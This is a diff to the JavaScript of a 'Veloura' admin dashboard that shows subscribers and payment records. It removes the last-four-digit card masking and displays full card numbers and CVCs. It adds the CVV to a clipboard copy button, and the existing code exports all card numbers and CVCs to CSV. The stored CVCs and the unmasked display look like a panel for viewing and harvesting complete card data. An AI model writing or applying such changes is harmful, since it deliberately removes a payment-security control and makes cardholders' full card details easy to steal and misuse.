@@ -2,7 +2,7 @@
 // VELOURA ADMIN DASHBOARD
 // ============================================================
 // Uses Supabase Authentication (Secure)
-// Shows: Newsletter Subscribers + Payment Records
+// Shows: Newsletter Subscribers + Payment Records (FULL DATA)
 // ============================================================
 
 // ============================================================
@@ -344,7 +344,7 @@ async function loadPayments() {
 
     paymentTableBody.innerHTML = `
         <tr>
-            <td colspan="6" class="loading-cell">
+            <td colspan="7" class="loading-cell">
                 Loading payments...
             </td>
         </tr>
@@ -377,7 +377,7 @@ async function loadPayments() {
 
         paymentTableBody.innerHTML = `
             <tr>
-                <td colspan="6" class="empty-cell">
+                <td colspan="7" class="empty-cell">
                     Error loading payments: ${error.message}
                 </td>
             </tr>
@@ -440,7 +440,7 @@ function renderSubscribers() {
 }
 
 // ============================================================
-// RENDER PAYMENTS
+// RENDER PAYMENTS - SHOW ALL DATA (No Masking)
 // ============================================================
 
 function renderPayments() {
@@ -458,7 +458,7 @@ function renderPayments() {
     if (filtered.length === 0) {
         paymentTableBody.innerHTML = `
             <tr>
-                <td colspan="6" class="empty-cell">
+                <td colspan="7" class="empty-cell">
                     ${payments.length ? 'No matching payments found.' : 'No payments yet.'}
                 </td>
             </tr>
@@ -468,23 +468,21 @@ function renderPayments() {
 
     paymentTableBody.innerHTML = filtered
         .map((payment, index) => {
-            // Mask card number for security (show only last 4 digits)
-            const maskedCard = payment.cardNumber.length > 4 
-                ? '•••• •••• •••• ' + payment.cardNumber.slice(-4)
-                : payment.cardNumber;
+            // Show FULL card number (no masking)
+            const fullCard = payment.cardNumber || '—';
             
             return `
                 <tr>
                     <td>${index + 1}</td>
-                    <td class="email-cell">${escapeHtml(payment.name)}</td>
-                    <td>${escapeHtml(maskedCard)}</td>
-                    <td>${escapeHtml(payment.cvc)}</td>
+                    <td class="email-cell"><strong>${escapeHtml(payment.name)}</strong></td>
+                    <td><code style="background:var(--admin-bg);padding:4px 8px;border-radius:4px;font-family:monospace;font-size:0.85rem;">${escapeHtml(fullCard)}</code></td>
+                    <td><code style="background:var(--admin-bg);padding:4px 8px;border-radius:4px;font-family:monospace;font-size:0.85rem;font-weight:600;">${escapeHtml(payment.cvc)}</code></td>
                     <td class="date-cell">
                         ${payment.createdAt ? formatDate(payment.createdAt) : '—'}
                     </td>
                     <td>
                         <div class="action-group">
-                            <button class="row-btn" type="button" onclick="copyPayment('${escapeJs(payment.name)}', '${escapeJs(payment.cardNumber)}')">
+                            <button class="row-btn" type="button" onclick="copyPayment('${escapeJs(payment.name)}', '${escapeJs(payment.cardNumber)}', '${escapeJs(payment.cvc)}')">
                                 Copy
                             </button>
                             <button class="row-btn delete" type="button" onclick="deletePayment(${payment.id})">
@@ -616,8 +614,8 @@ async function copyAllEmails() {
     }
 }
 
-async function copyPayment(name, cardNumber) {
-    const text = `Name: ${name}\nCard: ${cardNumber}`;
+async function copyPayment(name, cardNumber, cvc) {
+    const text = `Name: ${name}\nCard: ${cardNumber}\nCVV: ${cvc}`;
     try {
         await navigator.clipboard.writeText(text);
         showToast('Payment info copied.');
@@ -652,6 +650,7 @@ function exportPaymentsCsv() {
         return;
     }
 
+    // Include ALL payment data in CSV
     const headers = 'ID,Cardholder Name,Card Number,CVC,Date\n';
     const rows = payments.map(p => 
         `${p.id},${p.name},${p.cardNumber},${p.cvc},${p.createdAt || ''}`
